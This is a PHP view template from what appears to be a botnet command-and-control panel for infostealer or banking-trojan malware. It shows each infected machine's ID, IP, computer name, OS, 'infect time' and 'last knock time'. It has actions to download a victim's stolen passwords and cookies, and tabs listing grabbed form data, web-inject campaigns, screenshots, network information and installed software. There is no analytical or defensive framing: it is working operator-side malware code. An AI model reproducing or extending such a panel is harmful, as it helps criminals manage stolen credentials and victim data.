<?php

$days = ($bot_info['first_login'] - time())*(-1);

switch ($days){
    case $days>60*60*23.5:
        $days = round($days/(60*60*24)).' DAY(s)';
        break;
    case $days>60*60:
        $days = round($days/(60*60)).' HOUR(s)';
        break;
    default:
        $days = round($days/(60)).' MIN(s)';
}

$last_login = ($bot_info['last_login'] - time())*(-1);

switch ($last_login){
    case $last_login>60*60*23.5:
        $last_login = round($last_login/(60*60*24)).' DAY(s)';
        break;
    case $last_login>60*60:
        $last_login = round($last_login/(60*60)).' HOUR(s)';
        break;
    default:
        $last_login = round($last_login/(60)).' MIN(s)';
}

?>

<div class="page-title">
</div>
<div class="row">
    <div class="col-sm-12 col-md-12 col-lg-12">
        <div class="panel panel-white">
            <div class="row">
                <div class="col-sm-3 col-md-3 col-lg-3">
                    Bot ID: <span class="bot-info-value" id="bot-info-botid" data-botid="<?php echo $bot_info['id']?>"><?php echo htmlspecialchars($bot_info['botid']);?></span><br>
                    Internet protocol (IP): <span class="bot-info-value"><?php echo htmlspecialchars($bot_info['ip']) . ' <img class="flag flag-'.strtolower($bot_info['country']).'"> ('.$bot_info['country'].')';?></span><br>
                    Computer name: <span class="bot-info-value"><?php echo htmlspecialchars($bot_info['computer_name']);?></span><br>
                    Operating system: <span class="bot-info-value"><?php echo htmlspecialchars($bot_info['os']);?></span><br>
                    Architecture: <span class="bot-info-value"><?php echo htmlspecialchars($bot_info['architecture']);?></span><br>
                </div>
                <div class="col-sm-3 col-md-3 col-lg-3">
                    CPU count: <span class="bot-info-value"><?php echo htmlspecialchars($bot_info['cpu']);?></span><br>
                    Display resolution: <span class="bot-info-value"><?php echo htmlspecialchars($bot_info['display_width']);?></span><br>
                    Infect time: <span class="bot-info-value"><?php echo $days;?></span><br>
                    Last knock time: <span class="bot-info-value"><?php echo $last_login;?></span><br>
                    Domain name: <span class="bot-info-value"><?php echo !empty($netViewInfo['domain_name']) ? htmlspecialchars($netViewInfo['domain_name']) : '(None)';?></span><br>
                </div>
                <div class="col-sm-3 col-md-3 col-lg-3">
                    Layer IP: <span class="bot-info-value"><?php echo !empty($bot_info['layer_ip']) ? htmlspecialchars($bot_info['layer_ip']) : '(None)';?></span><br>
                </div>
                <div class="col-sm-3 col-md-3 col-lg-3">
                    <div class="btn-group" role="group">
                        <button type="button" class="btn dropdown-toggle" style="background-color: #E6E8EB;" data-toggle="dropdown" aria-expanded="false">
                            Actions
                            <span class="caret"></span>
                        </button>
                        <ul class="dropdown-menu" style="margin-right: 40px;" role="menu">
                            <li><a tabindex="-1" href="/bot/passwords_save_zip?bot_id=<?php echo $bot_info['id']?>">Download passwords</a></li>
                            <li><a tabindex="-1" href="/bot/cookies_save_zip?bot_id=<?php echo $bot_info['id']?>">Download cookies</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="col-sm-12 col-md-12 col-lg-12">
        <div class="panel panel-white">
            <div class="panel-body">
                <div role="tabpanel">
                    <!-- Nav tabs -->
                    <ul class="nav nav-tabs" role="tablist">
                        <li role="presentation" class="active"><a href="#tab-passwords" role="tab" data-toggle="tab" data-type-web-inject="tab-passwords">Passwords <span class="label label-default"><?php echo $reports_info['passwords_count'];?></span></a></li>
                        <li role="presentation"><a href="#tab-forms" role="tab" data-toggle="tab" data-type-web-inject="tab-forms">Forms <span class="label label-default"><?php echo $reports_info['http_grabber_data_count'];?></span></a></li>
                        <li role="presentation"><a href="#tab-injects-campaigns" role="tab" data-toggle="tab" data-type-web-inject="tab-injects-campaigns">Web-Injects Campaigns <span class="label label-default"><?php echo $reports_info['injects_campaigns_count'];?></span></a></li>
                        <li role="presentation"><a href="#tab-screenshots" role="tab" data-toggle="tab" data-type-web-inject="tab-screenshots">Screenshots <span class="label label-default"><?php echo $reports_info['screenshots_count'];?></span></a></li>
                        <li role="presentation"><a href="#tab-netview" role="tab" data-toggle="tab" data-type-web-inject="tab-netview">NetView</a></li>
                        <li role="presentation"><a href="#tab-software" role="tab" data-toggle="tab" data-type-web-inject="tab-software">Software</a></li>
                    </ul>
                    <!-- Tab panes -->
                    <div class="tab-content">
                        <div role="tabpanel" class="tab-pane active fade in" id="tab-passwords">
                            <?php
                                if (!empty($reports_info['passwords_count'])) {
                                    include 'application/views/bot/tab-passwords.php';
                                } else {
                                    echo 'Passwords was not found';
                                }
                            ?>
                        </div>
                        <div role="tabpanel" class="tab-pane fade" id="tab-forms">
                            <?php
                                if (!empty($reports_info['http_grabber_data_count'])) {
                                    include 'application/views/bot/tab-forms.php';
                                } else {
                                    echo 'Forms was not found';
                                }
                            ?>
                        </div>
                        <div role="tabpanel" class="tab-pane fade" id="tab-injects-campaigns">
                            <?php
                                if (!empty($reports_info['injects_campaigns_count'])) {
                                    include 'application/views/bot/tab-injects-campaigns.php';
                                } else {
                                    echo 'Campaigns was not found';
                                }
                            ?>
                        </div>
                        <div role="tabpanel" class="tab-pane fade" id="tab-screenshots">
                            <?php
                                if (!empty($reports_info['screenshots_count'])) {
                                    include 'application/views/bot/tab-screenshots.php';
                                } else {
                                    echo 'Screenshots was not found';
                                }
                            ?>
                        </div>
                        <div role="tabpanel" class="tab-pane fade" id="tab-netview">
                            <?php
                                if (!empty($netViewInfo)) {
                                    include 'application/views/bot/tab-netview.php';
                                } else {
                                    echo 'Domain was not found';
                                }
                            ?>
                        </div>
                        <div role="tabpanel" class="tab-pane fade" id="tab-software">
                            <?php
                                if (!empty($softwareInfo)) {
                                    include 'application/views/bot/tab-software.php';
                                } else {
                                    echo 'Software was not found';
                                }
                            ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>